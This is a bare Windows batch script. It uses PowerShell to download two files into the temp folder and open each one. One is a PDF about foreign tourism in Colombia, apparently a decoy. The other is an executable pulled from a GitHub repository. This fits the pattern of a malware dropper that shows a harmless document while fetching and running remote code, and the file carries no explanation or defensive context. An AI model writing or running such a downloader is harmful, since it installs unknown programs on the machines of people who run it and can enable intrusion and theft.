@echo off

set files='https://www.mastercardcenter.org/content/dam/mc-cig/uploads/Foreign-Tourism-and-Inclusive-Growth-in-Colombia.pdf','https://github.com/abrahambrit/WepX/raw/master/ner0x.exe'

powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"


